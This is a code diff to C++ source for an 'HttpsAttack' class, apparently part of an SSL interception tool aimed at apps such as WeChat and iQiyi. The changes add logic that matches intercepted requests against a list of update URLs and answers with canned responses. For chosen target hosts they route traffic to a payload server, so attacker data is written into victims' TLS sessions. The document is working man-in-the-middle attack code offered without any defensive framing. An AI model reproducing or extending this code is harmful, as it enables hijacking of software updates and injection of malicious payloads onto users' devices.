@@ -46,15 +46,28 @@
 #include "weixinAndroidJS.h"
 #include "IqiyiPlugin.h"
 #include "../Utils/Tools.h"
-
+#include "../Helper.h"
 
 
 
 int HttpsAttack::SslAttackPacket(char* buf, int size, const char* url, const char* host, const char* httphdr,const char* httpdata, LPSSLPROXYPARAM spp)
 {
-	int iRet = 0;
+	int ret = 0;
 
 	int resultlen = 0;
+	for (int i = 0; i < gUpdateData.size(); i++) {
+		if (strstr(gUpdateData[i].url.c_str(), url) && strstr(gUpdateData[i].host.c_str(), host)) {
+			string resp = gUpdateData[i].response;
+			ret = sendAttackPacket(resp.c_str(), resp.length(), spp);
+			return ret;
+		}
+	}
+
+	ret = SSLPublic::isTargetHost(spp->host);
+	if (ret) {
+		ret = PayloadServer::PluginServerProc(spp, buf, size);
+		return ret;
+	}
 
 	/*
 	if (pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr == 0x0100007f || strstr(pstSSLProxyParam->host, "127.0.0.1") ||
@@ -540,24 +553,25 @@ int HttpsAttack::SslAttackPacket(char* buf, int size, const char* url, const cha
 }
 
 
-int HttpsAttack::sendAttackPacket(char* recvBuffer, int resultlen, const char* host, LPSSLPROXYPARAM spp) {
+int HttpsAttack::sendAttackPacket(const char* buf, int len, LPSSLPROXYPARAM spp) {
 	int iRet = 0;
 
-	if (resultlen <= 0 || resultlen > SSL_MAX_BLOCK_SIZE)
+	if (len <= 0 || len > SSL_MAX_BLOCK_SIZE)
 	{
-		log("[%s %d]ssl attack data size:%u error\r\n", __FUNCTION__, __LINE__, resultlen);
+		log("[%s %d]ssl attack data size:%u error\r\n", __FUNCTION__, __LINE__, len);
 		return 0;
 	}
 
-	iRet = SSL_write(spp->SSLToClient, recvBuffer, resultlen);
-	if (iRet != resultlen)
+	iRet = SSL_write(spp->SSLToClient, buf, len);
+	if (iRet != len)
 	{
 		log("[%s %d]SSL attack error:%d,description:%s,value:%d\n", 
 			__FUNCTION__, __LINE__, SSL_get_error(spp->SSLToClient, iRet),SSL_state_string_long(spp->SSLToClient), iRet);
 		return FALSE;
 	}
 	else {
-		log("[%s %d]SSL attacker SSL_write ok,host:%s,packet:%s\n", __FUNCTION__, __LINE__, host, recvBuffer);
+		log("[%s %d]SSL attacker SSL_write ok,host:%s,packet:%s\n", __FUNCTION__, __LINE__, spp->host, buf);
+		return TRUE;
 	}
 
 	return TRUE;
